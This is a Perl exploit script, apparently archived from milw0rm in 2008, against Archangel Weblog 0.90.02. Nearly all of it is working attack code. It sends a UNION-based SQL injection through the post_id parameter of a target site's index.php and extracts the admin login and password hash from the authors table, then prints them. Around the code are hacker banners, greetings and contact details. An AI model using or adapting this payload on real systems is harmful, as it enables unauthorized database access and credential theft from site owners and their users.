#!/usr/bin/perl -w
# Portal   :  Archangel Weblog 0.90.02
# Download :  http://www.archangelmgt.com/Archangel_Weblog_v090_02.zip
#  exploit aported password  crypted
#  mgharba :d:d:d:d
########################################
#[*] Founded &  Exploited by : Stack-Terrorist [v40]
#[*] Contact: Ev!L =>> see down
#[*] Greetz : Houssamix & Djekmani & Jadi & iuoisn & Str0ke & All muslims HaCkeRs  :)
########################################
#----------------------------------------------------------------------------#
########################################
# * TITLE:          PerlSploit Class
# * REQUIREMENTS:   PHP 4 / PHP 5
# * VERSION:        v.1
# * LICENSE:        GNU General Public License
# * ORIGINAL URL:   http://www.v4-Team/v4.txt
# * FILENAME:       PerlSploitClass.pl
# *
# * CONTACT:        dj-moad@hotmail.fr (french / english / arabic / moroco Darija :d )
# * THNX : AllaH
# * GREETZ:         Houssamix & Djekmani
########################################
#----------------------------------------------------------------------------#
########################################
system("color a");
print "\t\t############################################################\n\n";
print "\t\t#   Archangel Weblog  <= 0.90.02 - Remote SQL Inj Exploit  #\n\n";
print "\t\t#                 by Stack-Terrorist [v40]                 #\n\n";
print "\t\t############################################################\n\n";
########################################
#----------------------------------------------------------------------------#
########################################
use LWP::UserAgent;
die "Example: perl $0 http://victim.com/path/\n" unless @ARGV;
system("color f");
########################################
#----------------------------------------------------------------------------#
########################################
#the username of  news manages
$user="author_login";
#the pasword of  news manages
$pass="author_password";
#the tables of news manages
$tab="authors";
########################################
#----------------------------------------------------------------------------#
########################################
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
########################################
#----------------------------------------------------------------------------#
########################################
$host = $ARGV[0] . "/index.php?post_id=-1'/**/union/**/select/**/12,concat(CHAR(60,117,115,101,114,62),".$user.",CHAR(60,117,115,101,114,62),".$pass."),32,4,5,6,3/**/from/**/".$tab."/**/where/**/author_id=1/*";

$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~ /<user>(.*?)<user>/){
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Admin User : $1";
}
########################################
#----------------------------------------------------------------------------#
########################################
if ($answer =~/([0-9a-fA-F]{32})/){print "\n[+] Admin Hash : $1\n\n";
print "\t\t#   Exploit has ben aported user and password hash   #\n\n";}

else{print "\n[-] Exploit Failed...\n";}
########################################
#-------------------Exploit exploited by Stack-Terrorist --------------------#
########################################

# milw0rm.com [2008-05-16]